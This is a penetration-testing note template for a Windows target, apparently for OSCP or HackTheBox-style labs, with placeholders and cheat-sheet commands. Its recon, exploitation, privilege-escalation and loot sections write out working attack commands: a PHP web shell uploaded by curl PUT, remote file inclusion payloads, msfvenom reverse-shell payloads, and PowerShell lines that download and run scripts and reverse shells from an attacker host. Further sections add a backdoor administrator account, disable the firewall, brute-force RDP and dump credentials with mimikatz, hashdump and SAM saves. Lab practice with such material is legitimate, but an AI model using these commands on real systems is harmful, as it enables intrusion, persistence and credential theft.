## Info-sheet


- DNS-Domain name:
- Host name:
- OS:
- Server:
- Workgroup:
- Windows domain:

Services and ports:

```
INSERTTCPSCAN
```

## Recon

### Guide

[Enumeration Cheat Sheet](http://0daysecurity.com/penetration-testing/enumeration.html)

[Black Winter Security Tools/Techniques](https://blackwintersecurity.com/tools/)

```
Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Service-version, default scripts, OS:
nmap INSERTIPADDRESS -sV -sC -O

# Scan all ports, might take a while.
nmap INSERTIPADDRESS -p-

# Scan for UDP
nmap INSERTIPADDRESS -sU
unicornscan -mU -v -I INSERTIPADDRESS

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772

# Monster scan
nmap INSERTIPADDRESS -p- -A -T4 -sC
```


### Port 21 - FTP

- Name:
- Version:
- Anonymous login:

FTP Test:

```
INSERTFTPTEST
```

```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
```

### Port 22 - SSH

- Name:
- Version:
- Protocol:
- RSA-key-fingerprint:
- Takes-password:
If you have usernames test login with username:username

SSH Connect:

```
INSERTSSHCONNECT
```

### Port 25

- Name:
- Version:
- VRFY:
- EXPN:

SMTP Connect:

```
INSERTSMTPCONNECT
```

```
nc -nvv INSERTIPADDRESS 25
HELO foo<cr><lf>

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
```

### Port 110 - Pop3

- Name:
- Version:

POP3 Connect:

```
INSERTPOP3CONNECT
```

### Port 111 - Rpcbind

```
INSERTRPCBIND
```

```
rpcinfo -p INSERTIPADDRESS

showmount -e INSERTIPADDRESS 

mkdir /mnt/<DIR>
mount -t nfs INSERTIPADDRESS:<Remote DIR> /mnt/<DIR>/
```

Information on NFS enumeration and exploiting NFS

[NFS Enumeration and Exploiting Misconfiguration](https://medium.com/@joe_norton/exploiting-metasploitable-without-metasploit-nfs-enumeration-and-exploiting-misconfiguration-86504ccd15b9)

[Vulnix Writeup](https://blog.christophetd.fr/write-up-vulnix/)

Note: You may have to match your permissions to the permissions on the share. See Vulnix.

### Port 135 - MSRPC

Some versions are vulnerable.

```
nmap INSERTIPADDRESS --script=msrpc-enum
```

Exploit:

```
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

### Port 139/445 - SMB

- Name:
- Version:
- Domain/workgroup name:
- Domain-sid:
- Allows unauthenticated login:


```
nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p 445

enum4linux -a INSERTIPADDRESS

rpcclient -U "" INSERTIPADDRESS
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
smbclient //INSERTIPADDRESS/admin$ -U john

Log in with shell:
winexe -U username //INSERTIPADDRESS "cmd.exe" --system

smbmap -H INSERTIPADDRESS
```

Exploit for Samba before 3.3.11, 3.4.x before 3.4.6, and 3.5.x before 3.5.0rc3, when a writable share exists:

* [Samba 3.4.5 - Symlink Directory Traversal](https://www.exploit-db.com/exploits/33598)
* [Samba Remote Directory Traversal](https://packetstormsecurity.com/files/85957/Samba-Remote-Directory-Traversal.html)
* [CVE-2010-0926](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0926)
* See HTB: Lame

If Windows then check for Eternal Blue (MS17-010):

* [MS17-010](https://github.com/worawit/MS17-010)
* See HTB: Blue
* See HTB: Legacy
* Use non-staged payload for zzz_exploit
  * msfvenom -p windows/shell_reverse_tcp LHOST= INSERTIPADDRESS LPORT=1906 -f exe-service -o eternal.exe

```
python checker.py INSERTIPADDRESS
```

[NetBIOS and SMB Penetration Testing on Windows](https://www.hackingarticles.in/netbios-and-smb-penetration-testing-on-windows/)

### Port 161/162 UDP - SNMP


```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
snmp-check -t INSERTIPADDRESS -c public
```

```
# Common community strings
public
private
community
```

### Port 554 - RTSP


### Port 1030/1032/1033/1038

Used by RPC to connect in domain network. Usually nothing.

### Port 1433 - MSSQL

- Version:

```
use auxiliary/scanner/mssql/mssql_ping

# Last options. Brute force.
scanner/mssql/mssql_login

# Log in to mssql
sqsh -S INSERTIPADDRESS -U sa

# Execute commands
xp_cmdshell 'date'
go
```

### Port 1521 - Oracle

Name:
Version:
Password protected:

```
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
```


### Port 2100 - Oracle XML DB

Can be accessed through ftp.
Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
- Name:
- Version:

Default logins:

```
sys:sys
scott:tiger
```

### Port 2049 - NFS

```
showmount -e INSERTIPADDRESS

If you find anything you can mount it like this:

mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
```

### 3306 - MySQL

- Name:
- Version:

```
mysql --host=INSERTIPADDRESS -u root -p

nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 INSERTIPADDRESS -p 3306
```

### Port 3339 - Oracle web interface

- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:
- Domain-name address:

### Port 3389 - Remote desktop

Test logging in to see what OS is running

```
rdesktop -u guest -p guest INSERTIPADDRESS -g 94%

# Brute force
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
```


### Port 80

- Server:
- Scripting language:
- Apache Modules:
- Domain-name address:

cURL Header:

```
INSERTCURLHEADER
```

- Web application
- Name:
- Version:

```
# Nikto
nikto -h http://INSERTIPADDRESS

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444

# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check if it is possible to upload using put
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php

# Check for title and all links
dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
```


#### Nikto scan

```
INSERTNIKTOSCAN
```


#### Url brute force

```
# Dirb
dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt

# Gobuster - remove relevant responde codes (403 for example)
gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e

# Dirsearch (multi-threaded)
dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://INSERTIPADDRESS -t 20 -e html
```

Dirb Scan:

```
INSERTDIRBSCAN
```


#### Default/Weak login

Google documentation for default passwords and test them:

```
site:webapplication.com password
```

```
admin admin
admin password
admin <blank>
admin nameofservice
root root
root admin
root password
root nameofservice
<username if you have> password
<username if you have> admin
<username if you have> username
<username if you have> nameofservice
```

#### LFI/RFI

```
# Kadimus
/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=


# Bypass execution
http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=index
base64 -d savefile.php

# Bypass extension
http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt%00
http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt?
```


#### SQL-Injection

```
# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
```

#### Sql-login-bypass


- Open Burp-suite
- Make and intercept request
- Send to intruder
- Cluster attack
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation

### Password brute force - last resort

```
cewl
```

### Port 443 - HTTPS

Heartbleed:

```
sslscan INSERTIPADDRESS:443
```

## Vulnerability analysis

Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilities and features.

### To try - List of possibilities
Add possible exploits here:


### Find sploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```

### Buffer Overflow

1. Fuzz the application to determine the appoximate size of the input.
2. Generate an pattern offset using "pattern_create.rb".
3. Locate the offset using the value of the EIP at the time of crash using "pattern_offset.rb".
4. Verify the offset overwriting the EIP with "B"s.
5. Eliminate the bad characters.
6. Generate the ops code using "nasm_shell.rb".
7. Find the a return address. If Windows, use "!mona modules". If Linux, use "objdump" or "readelf".
7. In the results, look for anything that does not have the protections enabled and bad characters in the address.
8. Search for the opscode in the executable or dll using "!mona find -s "\xff\4a" -m smfc.dll".
9. Verify the opscode is at the address by looking in the debugger.
10. Set a breakpoint at address in the debugger.
11. Modify the PoC to use the return address.
12. Test the return address. Verify the EIP has the return address and then jumps to the payload.
13. Generate the payload. Be sure to remove the bad characters and the size fits in the payload space. Also, choose the correct architecture (x86 or x86_64).

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.22.31 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x04\x05\xcf\xd0\xdb\xdc\xe1\xe2\xf2\xf3"
```

#### Guide

[Writing Exploits for Win32 Systems from Scratch](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/)

[Exploit Dev 101: Jumping to Shellcode](https://www.abatchy.com/2017/05/jumping-to-shellcode.html)

[Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode](https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/)

#### Mona.py

Create a configuration folder

`!mona config -set workingfolder c:\logs\%p`

Create a pattern

`!mona pc 6000`

Find a pattern

```
!mona pattern_offset 0x7A46317A (where 0x7A46317A is the value of EIP at the crash time)
!mona findmsp
```

Generate a bytearray and find bad chars

```
!mona bytearray
!mona bytearray -cpb \x00\x0a
!mona compare -f c:\logs\slmail\bytearray.bin -a 0x01cea154
```

Find instructions in memory

```
!mona jmp -r ESP
!mona jmp -r ESP -m mfc42loc.dll,slmfc.dll,Openc32.dll
```

## Privilege escalation

Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

- Kernel exploits
- Cleartext password
- Reconfigure service parameters
- Inside service
- Program running as root
- Installed software
- Scheduled tasks
- Weak passwords


### To-try list
Here you will add all possible leads. What to try.

### Guides

* [Absolomb Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
* [Black Winter Security](https://blackwintersecurity.com/)
* [PowerUp: A Usage Guide](https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/)

If Service account, and SEImpersonatePrivilege enabled, then run Rotten Potato/Juicy Potato.

### Scripts

* [Sherlock](https://github.com/rasta-mouse/Sherlock)
* [JAWS](https://github.com/411Hall/JAWS)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [Absolomb WindowsEnum](https://github.com/absolomb/WindowsEnum)
* [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
* [Empire](https://github.com/EmpireProject/Empire)

### Basic info

- OS:
- Version:
- Architecture:
- Current user:
- Hotfixes:
- Antivirus:

**Users:**

**Localgroups:**

```
systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *
whoami /all
whoami /priv

netsh firewall show state
netsh firewall show config

# Set path
set PATH=%PATH%;C:\xampp\php

tree c:\ /F
```
### Windows Paths

```
C:\Windows\System32
C:\Windows\SysWow64
C:\Windows\SysNative <- 64 Bit
```

### Powershell

Path

```
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
```

Open up Powershell

```
powershell.exe -nop -exec bypass
```

Non-interactive execute powershell file

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```

Invoke PowerUp without touching disk

```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.25/PowerUp.ps1'); Invoke-AllChecks"
```

Invoke a reverse shell

```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.25/rev.ps1')"
```

Download a file (within Powershell)

```
(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.25/jp.exe", "jp.exe")
```

Read a file

```
powershell (Get-Content filename)
```

[Nishang - Offensive PowerShell for red team, penetration testing and offensive security](https://github.com/samratashok/nishang)

### Kernel exploits


```
# Look for hotfixes
systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
site:exploit-db.com windows XX XX
```


### Cleartext passwords

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


### Reconfigure service parameters

- Unquoted service paths

Check book for instructions

- Weak service permissions

Check book for instructions

### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.

```
# Meterpreter
run get_local_subnets

netstat /a
netstat -ano
```

### Programs running as root/system



### Installed software

```
# Metasploit
ps

tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```


### Scheduled tasks

```
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```

### Weak passwords

Remote desktop

```
ncrack -vv --user george -P /usr/share/wordlists/rockyou.txt rdp://INSERTIPADDRESS
```

### Useful commands


**Add user and enable RDP**

```
net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Turn firewall off
netsh firewall set opmode disable

Or like this
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:

"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.""

Add this reg key:

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**File Transfer**

```
# Transfer files over SMB
impacket-smbserver SHARE <DIR>
```


## Loot

- Proof:
- Network secret:
- Password and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:

### Proof

```
hostname && whoami.exe && type proof.txt && ipconfig /all
```

### Network secret

### Passwords and hashes

```
wce32.exe -w
wce64.exe -w
fgdump.exe

reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

### Dualhomed

```
ipconfig /all
route print

# What other machines have been connected
arp -a
```

### Tcpdump

```
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

### Mail

### Browser

- Browser start-page:
- Browser-history:
- Saved passwords:

### Databases

### SSH-keys

## How to replicate:
